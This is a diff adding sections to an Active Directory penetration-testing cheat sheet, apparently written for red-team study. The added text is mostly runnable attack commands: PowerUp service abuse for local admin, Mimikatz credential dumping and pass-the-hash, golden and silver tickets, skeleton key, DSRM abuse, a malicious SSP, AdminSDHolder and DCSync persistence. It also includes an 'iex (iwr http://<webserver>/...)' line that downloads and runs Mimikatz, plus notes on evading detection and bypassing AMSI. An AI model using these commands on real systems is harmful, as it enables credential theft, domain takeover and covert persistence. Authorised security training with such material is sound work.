@@ -149,6 +149,8 @@ _Built-In Groups are good to check for membership e.g. Remote Desktop Users, Ser
 `Get-NetLocalGroup -ComputerName <computername> -ListGroups`
  - Get members of local groups on a machine (needs local admin privs)
 `Get-NetLocalGroup -ComputerName <computername> -Recurse`
+ - Find local admins on all machines in the domain (needs admin privileges)
+`Invoke-EnumerateLocalAdmin`
 
 #### AD Module
  - Get all groups in the current domains
@@ -260,6 +262,7 @@ Get-NetGPO -ADSPath '<adspath>'
  - List External Trusts
 `Get-NetForestDomain -Verbose | Get-NetDomainTrust | ?{$_.TrustType -eq 'External'}`
 `Get-NetDomainTrust | ?{$_.TrustType -eq 'External'}`
+`Get-NetDomainTrust -Domain <domainName>`
 
 #### AD Module
  - Enumerate the Domain Trusts
@@ -271,16 +274,227 @@ Get-NetGPO -ADSPath '<adspath>'
  - List all the domains in the forest
 `(Get-ADForest).Domains`
 
+### User Hunting
+You can look to see where else your current user has local admin access. This is very noisy.
+#### Powerview
+ - Find all machines in the current domain where the current user has local admin access
+`Find-LocalAdminAccess`
+ - The Find-LocalAdminAccess command uses the following command coupled with Get-NetComputer under the hood
+`Invoke-CheckLocalAdminAccess`
+ 
+ If RPC an SMB are blocked you can use WMI or PSRemoting 
+ - Nishang (https://github.com/samratashok/nishang) has
+`Find-PSRemotingLocalAdminAccess`
+ - With WMI
+`Find-WMILocalAdminAccess`
+
+ - Find computers where a domain admin (or other user/group) has a session (does not require admin privileges to query sessions, but does to find logged on users)
+`Invoke-UserHunter`
+`Invoke-UserHunter -GroupName "<GroupName>"`
+ - Find computers with a domain admin session and then checks to see if the current user has local admin access on that computer
+`Invoke-UserHunter -CheckAccess`
+ - Find users on high value targets (e.g. Domain Controllers, File Servers) (less noisy)
+`Invoke-UserHunter -Stealth`
+
+ - Find local admins on all machines in the domain (needs admin privileges)
+`Invoke-EnumerateLocalAdmin`
+
+
 ### Enumerating Applocker Policy
 #### AD Module 
  - Review Local AppLocker Effective Policy
 `Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`
 
-### BloodHound Ingestors
- - Using exe ingestor
-`.\SharpHound.exe --CollectionMethod All --LDAPUser <UserName> --LDAPPass <Password> --JSONFolder <PathToFile>`
- - Using PowerShell ingestor
+## Local Privilege Escalation
+Once you've established a connection to a target machine, you may need to escalate to Administrator, or another local user.
+Getting Administrative privileges can enable you to do things such as switch off AV, install tools and services, as well as grab credentials from other user's with local sessions straight out of memory. All the good stuff basically.
+
+Things to check:
+ - Missing patches
+ - Automated deployment or AutoLogon passwords in clear text
+ - AlwaysInstallElevated permissions
+ - Misconfigured services
+ - DLL Hijacking
+
+### PowerUp
+https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc
+`. .\PowerUp.ps1`
+There are many more options available inside PowerUp than are listed below. It's advised to read the ReadMe above for the latest information and functions.
+
+*Note - PowerUp and PowerView can conflict so it is not advised to run both modules in the same session.*
+
+#### Running all privilege escalation checks
+PowerUp can run through its list of escalation vectors and check if any are possible on the machine
+`Invoke-AllChecks`
+
+#### Automatic
+PowerUp can also automate the process
+`Invoke-PrivEsc`
+
+#### Service misconfiguration abuse
+- Find local services that are configured with unquoted whitespace. This weak configuration allows us to inject a malicious process into the path.
+`Get-ServiceUnquoted`
+ - If we have the permissions to modify a service we can change the path to a malicious executable. PowerUp allows us to easily check for this.
+`Get-ModifiableService`
+ - The abuse function adds our current user to the local Administrators group. It will also restore the abused service back to its original state to try to avoid detection
+`Invoke-ServiceAbuse -Name '<servicename>' -UserName '<usertoescalate>'`
+ - Log off and on again to get local admin
+ - Check the admin group
+`net localgroup Administrators`
+
+### BeRoot
+https://github.com/AlessandroZ/BeRoot
+ - Run BeRoot.exe
+
+## Lateral Movement
+### PowerShell Remoting
+PowerShell Remoting needs local admin access, and is enabled by default on Servers.
+It can be enabled on workstations using
+`Enable-PSRemoting`
+
+#### One-to-One
+ - Connect to a server using PowerShell Remoting
+`Enter-PSSession <servername>`
+ - Create a session for reuse
+`$sessionname = New-PSSession <targetserver>`
+ - Enter the saved session
+`Enter-PSSession $sessionname`
+ - Run commands on a remote server
+`Invoke-Command -ScriptBlock{whoami;hostname} -ComputerName <computer-name>`
+ - Run scripts on a remote server (encodes in base64 scriptblock and runs in memory on the target)
+`Invoke-Command -FilePath c:\scripts\script.ps1 -ComputerName <computer-name>`
+ - Run locally loaded functions on remote machines
+`Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName <computer-name>`
+ - Pass **positional** arguments to locally loaded functions on remote machines
+`Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName <computer-name> - ArgumentList`
+ - Run "Stateful" commands on a remote session
 ```
-. .\SharpHound.ps1
-Invoke-BloodHound -CollectionMethod All  -LDAPUser <UserName> -LDAPPass <Password> -OutputDirectory <PathToFile>
+# Create a session
+$sessionname = New-PSSession <targetserver>
+# Execute the command in the session and save to a variable
+Invoke-Command -Session $sessionname -ScriptBlock {$Proc = Get-Process}`
+# Execute the command variable in the session
+Invoke-Command -Session $sessionname -ScriptBlock {$Proc}
+# Treat the variable like the route function as required
+Invoke-Command -Session $sessionname -ScriptBlock {$Proc.Name}
 ```
+
+#### One-to-Many (Fan-out)
+All of the One-to-One commands can be run in parallel on multiple targets by providing a list.
+ - Run commands on a list of servers
+`Invoke-Command -ScriptBlock{whoami;hostname} -ComputerName (Get-Content <listofservers>`)
+ - Run scripts on a list of remote servers
+`Invoke-Command -FilePath c:\scripts\script.ps1 -ComputerName (Get-Content <listofservers>)`
+
+#### Credentials
+All of the above commands can have the credentials entered manually when prompted. It can be easier to save these to a variable.
+```
+$securepassword = ConvertTo-SecureString '<password123>' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('<domain>\<username>', $SecPassword)
+Invoke-Command -ComputerName <computer-name> -Credential $Cred -ScriptBlock {whoami}
+```
+### Lateral Movement with Mimikatz
+We can use Mimikatz remotely to extract credentials and do all kinds of other cool stuff.
+ - Dump credentials on local machine
+`Invoke-Mimikatz`
+Or
+`Invoke-Mimikatz -Command '"sekurlsa::ekeys"'`
+ - Dump credentials on remote machines (uses Invoke-Command in the background)
+`Invoke-Mimikatz -ComputerName <computername>`
+*Note if you are running this from a reverse shell you will need to setup a New-PSSession to the target machine e.g.*
+```
+iex (iwr http://<webserver>/Invoke-Mimikatz.ps1 -UseBasicParsing)
+$sess = New-PSSession -ComputerName <targetserver>
+Invoke-Command -ScriptBlock {$function:Invoke-Mimikatz} -Session $sess
+```
+ - On multiple targets
+`Invoke-Mimikatz -ComputerName @("sys1", "sys2")`
+ - **Over pass the hash** and start a new PowerShell process as the target user
+*Needs to be run from an elevated shell*
+`Invoke-Mimikatz -Command '"sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<ntlmhash> /run:powershell.exe"'`
+*You are now authenticated as the target user, but to run commands on the target server as that user use:*
+```
+Enter-PSSession <targetserver>
+whoami
+```
+
+## Persistence
+You've reached Domain Admin, let's see if you can stay there in case your entry point gets cleaned up.
+	*If you wanna take a swing at the King, you better not miss!*
+### Golden Ticket
+ - Execute Mimikatz on DC as DA to get krbtgt hash
+`Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <domaincontroller>`
+ - Use it
+`Invoke-Mimikatz -Command '"kerberos::golden /User:<any-username-youwant> /domain:<domainname> /sid:<domainSID> /krbtgt:<krbtgt-ntlm-hash> id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'`
+/endin and /renewmax parameters are optional, but for good opsec these should match the target domain kerberos policy.
+/ptt will use the ticket in the current process, /ticket can be used to save the kerberos ticket to disk.
+`lsadump::dcsync` can be used instead of `lsadump::lsa /patch` and can be more silent, although might get picked up by other defences.
+ - That gives you DA privileges in the current session. Check by running commands e.g.:
+`ls \\<domaincontroller>\c$`
+OR
+`gwmi -Class win32_computersystem -ComputerName <domaincontroller>`
+
+### Silver Ticket
+While technically a Persistence technique, there are circumstances that might present privilege escalation routes.
+ - Use Mimikatz to generate a Silver ticket for the CIFS services on a target server.
+`Invoke-Mimikatz -Command '"kerberos::golden /domain:<domainname> /sid:<domainSID> /target:<targetserver> /service:cifs /rc4:<ntlm hash of service account> /user:Administrator /ptt"'`
+ - For WMI we need two tickets, for HOST and RPCSS
+`Invoke-Mimikatz -Command '"kerberos::golden /domain:<domainname> /sid:<domainSID> /target:<targetserver> /service:HOST /rc4:<ntlm hash of service account> /user:Administrator /ptt"'`
+`Invoke-Mimikatz -Command '"kerberos::golden /domain:<domainname> /sid:<domainSID> /target:<targetserver> /service:RPCSS /rc4:<ntlm hash of service account> /user:Administrator /ptt"'`
+Now you can run WMI commands:
+`Get-WmiObject -Class win32_operatingsystem -ComputerName <targetserver>`
+
+
+### Skeleton Key
+The Skeleton Key attack injects a skeleton key password into the DC LSASS process which allows access to any valid user in the domain with the skeleton key password.
+
+ - Inject the Skeleton Key 'mimikatz' using...Mimikatz
+`Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <targetDC>`
+This allows you to login as any user with the password 'mimikatz'.
+
+### DSRM
+Abusing the DSRM account can give you persistent access to the DC.
+ - Dump DSRM password (needs DA privs)
+	 - `Enter-PSSession -Session $sess`
+	 - *bypass AMSI*
+	 - `Invoke-Command -FilePath C:\Invoke-Mimikatz.ps1 -Session $sess`
+	 - `Enter-PSSession -Session $sess`
+	 - `Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'`
+ - Edit the registry on the DC to enable the DSRM account to logon
+`New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD`
+ - Pass the hash from your attacker machine to 
+`Invoke-Mimikatz -Command '"sekurlsa::pth /domain:<targetdchostname> /user:Administrator /ntlm:<ntlmhash>  /run:powershell.exe"'`
+ - Access the DC from the attacker machine
+`ls \\<targetdc>\c$`
+
+### Custom SSP
+This attack is only really much good as a Proof of Concept out of the box, and would require some source code in mimilib.dll editing to store the credentials somewhere that could be reached if used in an engagement.
+ - Save the mimilib.dll in the system32 folder on the DC
+ - Add it to the Security Packages in the registry
+```
+$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' | select -ExpandProperty 'Security Packages'
+$packages += "mimilib"
+
+Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages
+
+Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
+```
+This can also be injected into lsass (unstable with Server 2016
+`Invoke-Mimikatz -Command '"misc::memssp"'`
+
+### AdminSDHolder
+ - Add FullControl permissions for a user to the AdminSDHolder using PowerView
+`Add-ObjectACL -TargetADSprefix 'CN=AdminSDHolder, CN=System' -PrincipalSamAccountName '<username>' -Rights All`
+- Using RACE toolkit (https://github.com/samratashok/RACE):
+`Set-DCPermissions -Method AdminSDHolder -SAMAccountName <user> -Right GenericAll -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=domain,DC=local'`
+
+### DCSync
+ - Check if the user has replication rights (powerview). No output means that it doesn't have the permissions.
+`Get-ObjectAcl -DistinguishedName "<domainDN>" -ResolveGUIDs | ? {($_.IdentityReference -match "<username>") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}`
+ - Add the rights if you have sufficient access (Domain Admin)
+	 - Powerview
+`Add-ObjectAcl -TargetDistinguishedName "<domainDN>" -PrincipalSamAccountName <username> -Rights DCSync -Verbose`
+	 - AD Module and RACE
+`Set-ADACL -SamAccountName <username> -DistinguishedName '<domainDN>' -GUIDRight DCSync`
+ - Extract hashes or krbtgt (or any other user) using the DCSync rights and Mimikatz
+`Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'`
